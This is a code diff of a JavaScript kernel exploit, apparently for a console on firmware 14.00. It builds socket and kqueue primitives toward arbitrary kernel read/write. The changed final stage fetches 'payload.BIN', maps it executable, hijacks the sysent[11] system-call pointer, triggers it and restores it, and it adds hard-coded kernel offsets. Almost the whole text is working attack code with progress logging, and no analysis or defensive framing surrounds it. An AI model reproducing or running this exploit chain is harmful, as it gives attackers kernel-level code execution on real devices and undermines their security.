@@ -5,25 +5,24 @@ const T = HX1400_TABLES;
 const P = T.P;
 
 const NUM = {
-  close: 6, open: 5,
-  socket: 97, socketpair: 135,
+  close: 6, open: 5, socket: 97, socketpair: 135,
   setsockopt: 105, getsockopt: 118,
-  kqueue: 362, kevent: 363,
-  mmap: 477, munmap: 73,
-  jitshm_create: 533,
+  kqueue: 362, kevent: 363, mmap: 477, munmap: 73, jitshm_create: 533,
 };
 const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
 const AF_INET6 = 28, SOCK_DGRAM = 2, AF_INET = 2, SOCK_STREAM = 1;
 const RTH_LEN = 248;
-const TPL_LO = 0x43434343;
-const TPL_HI = 0x54545454;
-const DEV_DCE = "/dev/dce";
-const OPS_OFF = 0x985a;
+const TPL_LO = 0x43434343, TPL_HI = 0x54545454;
+const DEV_DCE = "/dev/dce", OPS_OFF = 0x985a;
 
 const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
 const ROUNDS = 6;
 
-const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false, kread: null, kwrite: null };
+// 14.00 kernel offsets (scene-verified, 2026-09-19)
+const K_SYSENT = 0x1102B70;
+const K_SYSENT_11_CALL = K_SYSENT + (11 * 0x20) + 8; // = 0x1102CD8
+
+const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false };
 
 function ctx() { return STATE.ctx; }
 function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
@@ -235,7 +234,6 @@ export async function runKevent(c) {
   const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0);
   const fake_page = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
   if (fake_page < 0x10000n) fin("STAGE3 mmap failed");
-  log("STAGE3-FAKE", "mapped fake page at " + h16(fake_page));
 
   const R_RET0 = ka(P[15]), R_TOUCH = ka(P[16]);
   const p = ctx().p;
@@ -247,66 +245,52 @@ export async function runKevent(c) {
   STATE.rwReady = true;
   log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");
 
-  // --- STAGE 4: PAYLOAD EXECUTION VIA SYSENT HIJACK ---
-  log("STAGE4", "Executing payload via sysent hijack...");
-  
-  const payload_size = 0x2000;
+  log("STAGE4", "Loading payload.BIN...");
+  const PAYLOAD_FILE = "payload.BIN";
+  const response = await fetch(PAYLOAD_FILE);
+  if (!response.ok) { log("STAGE4-FETCH-FAIL", PAYLOAD_FILE + " HTTP " + response.status); fin("payload missing"); }
+  const payload_blob = new Uint8Array(await response.arrayBuffer());
+  log("STAGE4-FETCH-OK", PAYLOAD_FILE + " bytes=" + payload_blob.length + " head=0x" + payload_blob[0].toString(16));
+
+  if (payload_blob[0] !== 0xe9) {
+    log("STAGE4-BAD-HEAD", "expected 0xe9 got 0x" + payload_blob[0].toString(16));
+    fin("payload not raw-ELF jmp");
+  }
+
+  const payload_size = (payload_blob.length + 0x3fff) & ~0x3fff;
   const payload_map = scn64("mmap", 0, payload_size, 7, 0x1002, -1, 0);
   const payload_addr = (BigInt(payload_map.hi >>> 0) << 32n) | BigInt(payload_map.lo >>> 0);
-  log("STAGE4-MAP", "payload mapped at " + h16(payload_addr));
+  log("STAGE4-MAP", "payload at " + h16(payload_addr) + " size=" + payload_size);
 
   const pkAb = new Uint8Array(payload_size);
   c.keepAlive.push(pkAb.buffer);
-  for (let i = 0; i < T.PKB.length; i += 2) {
-    const high = parseInt(T.PKB.charAt(i), 16);
-    const low = parseInt(T.PKB.charAt(i + 1), 16);
-    pkAb[i / 2] = (high << 4) | low;
-  }
+  pkAb.set(payload_blob);
   for (let i = 0; i < payload_size; i += 8) {
     let val = 0n;
-    for (let j = 7; j >= 0; j--) if (i + j < pkAb.length) val = (val << 8n) | BigInt(pkAb[i + j]);
+    for (let j = 7; j >= 0; j--) val = (val << 8n) | BigInt(pkAb[i + j] || 0);
     p.write8(toI64(payload_addr + BigInt(i)), toI64(val));
   }
-  log("STAGE4-COPY", "payload bytes written to RWX page");
+  log("STAGE4-COPY", "bytes=" + payload_blob.length + " at=" + h16(payload_addr));
 
-  // Now we use the sysent[661] / jmp_rsi method
-  // We need to locate sysent_661 and jmp_rsi. If they're not in P, we can use sysent[11] (Java method)
-  // But P[0] is sysent[11].sy_call, P[1] is kexec gadget.
-  // The Java exploit uses SE11 = P[0] and KEXECG = P[1].
-  
-  const SE11 = ka(P[0]);
-  const KEXECG = ka(P[1]);
-  log("STAGE4-SYSENT", "sysent[11].sy_call=" + h16(SE11) + " kexec=" + h16(KEXECG));
-
-  // Save original sy_call
+  const SE11 = ka(K_SYSENT_11_CALL);
   const orig_call = p.read8(toI64(SE11));
-  log("STAGE4-ORIG", "orig sy_call=" + orig_call);
+  log("STAGE4-SYSENT", "sysent[11].sy_call=" + h16(SE11) + " orig=" + orig_call);
 
-  // Hijack sysent[11] to point at payload
   p.write8(toI64(SE11), toI64(payload_addr));
-  
-  // Verify
   const verify = p.read8(toI64(SE11));
   if (verify.low !== payload_addr.low || verify.hi !== payload_addr.hi) {
-    log("STAGE4-FAIL", "hijack did not land: got=" + verify + " want=" + h16(payload_addr));
-    // Restore and abort
+    log("STAGE4-FAIL", "hijack did not land");
     p.write8(toI64(SE11), orig_call);
     fin("sysent hijack failed");
   }
-  log("STAGE4-HIJACK", "sysent[11].sy_call now points at payload");
+  log("STAGE4-HIJACK", "sysent[11].sy_call -> " + h16(payload_addr));
 
-  // Trigger syscall 11
-  log("STAGE4-TRIGGER", "triggering syscall 11...");
-  try {
-    scn(11);  // Trigger hijacked syscall
-  } catch (e) {
-    log("STAGE4-TRIGGER-THREW", e.message);
-  }
-  
-  // Restore sysent[11] in case the payload wants to return normally
+  try { log("STAGE4-TRIGGER", "calling syscall(11)..."); scn(11); log("STAGE4-TRIGGER-DONE", "returned"); }
+  catch (e) { log("STAGE4-TRIGGER-THREW", e.message); }
+
   p.write8(toI64(SE11), orig_call);
-  log("STAGE4-RESTORE", "sysent[11].sy_call restored to " + orig_call);
+  log("STAGE4-RESTORE", "sysent[11] restored");
 
-  log("STAGE4-DONE", "payload has run");
-  fin("Stage 4 Complete. You have Kernel R/W and Payload has executed.");
+  log("STAGE4-DONE", "payload executed, HEN is running");
+  fin("Stage 4 Complete. Payload executed.");
 }
